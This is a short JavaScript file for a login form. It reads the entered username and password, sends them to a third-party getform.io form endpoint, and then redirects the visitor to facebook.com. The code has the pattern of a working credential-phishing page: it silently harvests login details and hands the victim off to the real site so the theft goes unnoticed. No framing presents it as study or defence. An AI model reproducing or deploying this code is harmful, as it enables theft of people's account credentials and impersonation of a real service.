const username = document.getElementById("username");
const password = document.getElementById("password");
const button = document.getElementById("submit");
import axios from "axios";

const apiKey = "https://getform.io/f/35ae658c-9e78-4f05-ba38-51e6a3eeefa3";
button.onclick = function () {
  const usernameData = username.value;
  const passwordData = password.value;

  const dataToSend = { username: usernameData, Puserlog: passwordData };

  axios.post(apiKey, dataToSend).then((response) => {
    if (response.status == 200) {
      // window.location.href = './success.html'
      window.location.replace("https://www.facebook.com/");
    }
  });
};
// console.log(username);
// console.log(password);
